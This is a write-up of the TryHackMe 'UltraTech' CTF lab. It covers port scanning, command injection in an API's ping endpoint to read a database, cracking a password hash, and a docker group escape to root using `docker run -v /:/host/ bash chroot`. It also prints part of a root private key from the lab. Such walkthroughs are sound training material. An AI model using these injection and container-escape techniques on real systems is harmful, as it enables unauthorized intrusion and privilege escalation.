# UltraTech
**Date:** April 22nd 2022

**Author:** j.info

**Link:** [**UltraTech**](https://tryhackme.com/room/ultratech1) CTF on TryHackMe

**TryHackMe Difficulty Rating:** Medium

<br>

![](images/ultratech0.png)

<br>

## Objectives
- Which software is using the port 8081?
- Which other non-standard port is used?
- Which software using this port?
- Which GNU/Linux distribution seems to be used?
- The software using the port 8080 is a REST api, how many of its routes are used by the web application?
- There is a database lying around, what is its filename? 
- What is the first user's password hash?
- What is the password associated with this hash?
- What are the first 9 characters of the root user's private SSH key?

<br>

## Initial Enumeration

### Nmap Scan

`sudo nmap -sV -sC -T4 10.10.195.124`

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8081/tcp open  http    Node.js Express framework
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
```

I run an all port scan and get back the last 31331 port listed, and then run that through -sC -sV to get additional information on it.

We can also answer the the first 4 object questions from this scan.

<br>

### Gobuster Scan

`gobuster dir -u http://10.10.195.124 -t 100 -r -x php,txt,html -w dir-med.txt`

```
/robots.txt           (Status: 200) [Size: 53]
/partners.html        (Status: 200) [Size: 1986]
/javascript           (Status: 403) [Size: 302]
/index.html           (Status: 200) [Size: 6092]
/css                  (Status: 200) [Size: 1139]
/images               (Status: 200) [Size: 4171]
/js                   (Status: 200) [Size: 1324]
/what.html            (Status: 200) [Size: 2534]
```

<br>

## Website Digging

Visiting the main page on port 31331:

![](images/ultratech1.png)

<br>

The Contact Us NOW button is associated with the email address:

```
ultratech@yopmail.com
```

Robots.txt shows us:

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

And that sitemap:

```
/
/index.html
/what.html
/partners.html
```

Visiting **partners.html** brings us to a login page:

![](images/ultratech2.png)

<br>

Taking a look in **/js** shows us 3 javascript files:

![](images/ultratech3.png)

<br>

Looking through them I find the answer to the 5th objective in the **api.js** file in these 2 lines of code:

```javascript
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`

form.action = `http://${getAPIURL()}/auth`;
```

**NOTE:** The 5th objective has a typo and mentions port **8080** which does not exist, they meant **8081**.

Visiting the site on port 8081 takes us to the API which looks like it's up and running:

```
UltraTech API v0.1.3
```

<br>

## API and Command Injection

I start by investigating the API using **/ping** and pointing it to the Google DNS server:

![](images/ultratech4.png)

<br>

It doesn't receive a response, but it is working. Now let's see if we can use some command injection here. I try to get the hostname and it works:

![](images/ultratech5.png)

<br>

I modify the command to run an `ls` and it shows us the name of a database, which answers objective number 6:

```
ping: utech.db.sqlite: Name or service not known 
```

I run a `cat utech.db.sqlite` through and get the following back:

![](images/ultratech6.png)

<br>

The format is pretty terrible but you can tell that the M in fromt of r00t shouldn't be there since it also shows up before admin in the middle. The password hash ends up being everything after r00t up until the closing ).

Checking [**crackstation.net**](https://crackstation.net/) gives us the password immediately:

![](images/ultratech7.png)

<br>

With these we can answer the 6th and 7th objectives.

You can also crack the hash for the admin user but it's not necessary for this CTF.

The last objective asks us for the first 9 characters of the root users private .ssh key so I try and cat it through the API, but it doesn't allow us:

```
cat: /root/.ssh/id_rsa: Permission denied 
```

<br>

## System Access

I try and ssh over as the user we have credentials for out of the database and am able to successfully login:

`ssh r00t@10.10.111.32`

```
r00t@ultratech-prod:~$ whoami
r00t
```

I check `sudo -l` but we're not allowed. Looking for SUID files shows us nothing interesting. Nothing good under capabilities either. We do however see that we have the **docker** group:

```
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

<br>

## Docker

I check to see if **docker.sock** is mounted, and it is, so we can use that to our advantage:

`find / -name docker.sock 2>/dev/null`

```
/run/docker.sock
```

Getting a list of images:

`docker images`

```
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        3 years ago         15.8MB
```

And using the [**HackTricks mounted docker socket escape**](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounted-docker-socket-escape) we're able get root in the bash image:

`docker run -it -v /:/host/ bash chroot /host/ bash`

```
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@47c100e0d80b:/# whoami
root
```

This allows us to obtain the last objective by looking at **/root/.ssh/id_rsa**:

```
root@47c100e0d80b:~/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
```

<br>

With that we've completed this CTF!

![](images/ultratech8.png)

<br>

## Conclusion

A quick run down of what we covered in this CTF:

- Basic enumeration with **nmap** and **gobuster**
- Manual enumeration of a website and it's API
- Using **command injection** against the API to obtain a user and password hash
- Running the password hash through **crackstation** to obtain the password
- Abusing **docker group memebership** to use an image as root and obtain the **private ssh key**

<br>

Many thanks to:
- [**lp1**](https://tryhackme.com/p/lp1) for creating this CTF
- **TryHackMe** for hosting this CTF

<br>

You can visit them at: [**https://tryhackme.com**](https://tryhackme.com)